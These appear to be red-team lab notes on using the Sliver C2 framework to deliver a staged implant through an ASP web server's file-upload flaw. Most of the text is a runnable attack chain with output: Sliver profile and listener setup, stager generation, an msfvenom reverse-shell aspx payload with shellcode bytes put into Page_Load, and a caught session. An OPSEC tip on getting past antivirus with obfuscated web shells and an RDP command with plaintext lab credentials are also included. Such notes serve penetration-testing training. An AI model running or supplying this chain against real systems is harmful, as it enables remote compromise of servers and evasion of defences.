NOTE: Newest version of sliver no longer uses stagers...

Scenario: We have identified a file upload vulnerability on a ASP web server. We want to set up a stager to execute our implants. [Stagers Wiki](https://github.com/BishopFox/sliver/wiki/Stagers)

Stagers are the first-stage payload in a staged attack -- small and non-suspicious

Requirements
	Create a profile
	Create a stage-listener
	Create a stager
	Create a payload (msfvenom) `NOTE: This will get flagged by AV/EDR`

Staged payload example (v3.1.8 - OLD)
```bash
# PROFILE: implant blueprint (the "real" payload the stager will fetch)
sliver > profiles new --http 10.10.15.5:8088 --format shellcode htb

	#[*] Saved new implant profile htb

# STAGE-LISTENER: serves the implant shellcode to whatever connects on 4443
sliver > stage-listener --url tcp://10.10.15.5:4443 --profile htb

	#[*] No builds found for profile htb, generating a new one
	#[*] Sliver name for profile htb: HIGH_RISER
	#[*] Job 2 (tcp) started

# HTTP LISTENER: the C2 channel itself, where the implant phones home (8088)
sliver > http -L 10.10.15.5 -l 8088

	#[*] Starting HTTP :8088 listener ...
	#[*] Successfully started job #3

# STAGER: the small first-stage shellcode you actually deliver to the target
sliver > generate stager --lhost 10.10.15.5 --lport 4443 --format csharp --save staged.txt

	#[*] Sliver implant stager saved to: /home/htb-ac590/staged.txt

# Generate msfvenom aspx payload
msfvenom -p windows/shell/reverse_tcp LHOST=10.10.15.5 LPORT=4443 -f aspx > sliver.aspx

# Modify .aspx payload
Take new byte [511] array from staged.txt and place in sliver.aspx file into the Page_Load function
	
	# Example - mO0UY will be different!
    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] mO0UY = new byte[511] {0xfc,0x48,0x83,0xe4,0xf0,0xe8,
        0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,
        0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
        0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,
        0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,
        0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,
        0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x41,0x51,0x66,
        0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
        0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01

# Trigger .aspx payload, catch connnection with Sliver
#[*] Session 42952b33 HIGH_RISER - 10.129.205.234:49702 (web01) - windows/amd64 - Mon, 02 Oct 2023 12:43:39 BST

# Connect to session
sliver > sessions     # view sessions 
sliver > use <ID>     # tab completion
```


Session names render in **RED** → interactive
Beacon names render in **BLUE** → asynchronous, not interactive

> **OPSEC NOTE:**  We uploaded an msfvenom .NET web shell, which is signatured heavily by various Anti-Virus vendors; it is insufficient to bypass common anti-virus software. However, we may upload an obfuscated web shell that provides command execution capability, then deliver the Sliver implant that way. [SharpyShell](https://github.com/antonioCoco/SharPyShell) is an option

## Assumed Breach 
If we are GIVEN credentials, we can just get an initial beacon and do some basic surveying

```bash
# RDP in
xfreerdp /v:TARGET /u:eric /p:'Letmein123' /d:child.htb.local /cert-ignore /sec:tls /drive:academy,"/workspace/sliver_ops" /dynamic-resolution
```

See [[User Access Control (UAC)]] on checking for UAC upon initial access